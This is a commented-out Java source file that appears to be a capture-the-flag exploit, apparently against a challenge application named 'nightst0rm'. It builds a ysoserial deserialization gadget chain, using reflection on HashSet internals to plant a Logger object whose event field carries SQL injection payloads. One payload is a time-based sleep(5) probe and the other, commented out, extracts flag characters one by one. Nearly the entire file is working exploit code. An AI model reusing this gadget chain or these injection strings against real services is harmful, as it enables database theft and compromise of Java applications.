///*
// * To change this license header, choose License Headers in Project Properties.
// * To change this template file, choose Tools | Templates
// * and open the template in the editor.
// */
//package net.nightst0rm.utils;
//
//import java.lang.reflect.Field;
//import java.util.HashMap;
//import java.util.HashSet;
//import java.util.Map;
//import net.nightst0rm.entities.Logger;
//import net.nightst0rm.entities.Token;
//import net.nightst0rm.entities.TokenManager;
//import org.apache.commons.lang3.builder.HashCodeMaker;
//import ysoserial.payloads.ObjectPayload;
//import ysoserial.payloads.util.PayloadRunner;
//
///**
// *
// * @author qubu
// */
//public class payloadtest implements ObjectPayload<Object>{
//    
//    @Override
//    public Object getObject(String command) throws Exception {
//        Logger logger = new Logger();
////        logger.setEvent("1' ^ (SELECT CONV(HEX(SUBSTRING(flag,3,1)),16,10) FROM 9st0rm_s3cr3t) ^ '1");
//        logger.setEvent("1' ^ (SELECT sleep(5)) ^ '1");
//        Token token = new Token();
//        token.setUser_id(1);
//        token.setLogger(logger);
//        TokenManager tmap = new TokenManager();
//        tmap.setToken(token);
//        HashCodeMaker entry = new HashCodeMaker();
//        entry.setMap(tmap);
//
//        HashSet map = new HashSet(1);
//        map.add("foo");
//        Field f = null;
//        try {
//            f = HashSet.class.getDeclaredField("map");
//        } catch (NoSuchFieldException e) {
//            f = HashSet.class.getDeclaredField("backingMap");
//        }
//
//        f.setAccessible(true);
//        HashMap innimpl = (HashMap) f.get(map);
//
//        Field f2 = null;
//        try {
//            f2 = HashMap.class.getDeclaredField("table");
//        } catch (NoSuchFieldException e) {
//            f2 = HashMap.class.getDeclaredField("elementData");
//        }
//
//
//        f2.setAccessible(true);
//        Object[] array = (Object[]) f2.get(innimpl);
//
//        Object node = array[0];
//        if(node == null){
//            node = array[1];
//        }
//
//        Field keyField = null;
//        try{
//            keyField = node.getClass().getDeclaredField("key");
//        }catch(Exception e){
//            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
//        }
//
//        keyField.setAccessible(true);
//        keyField.set(node, entry);
//
//        return map;
//    }
//    public static void main(final String[] args) throws Exception {
//        PayloadRunner.run(payloadtest.class, args);
//    }
//    
//}
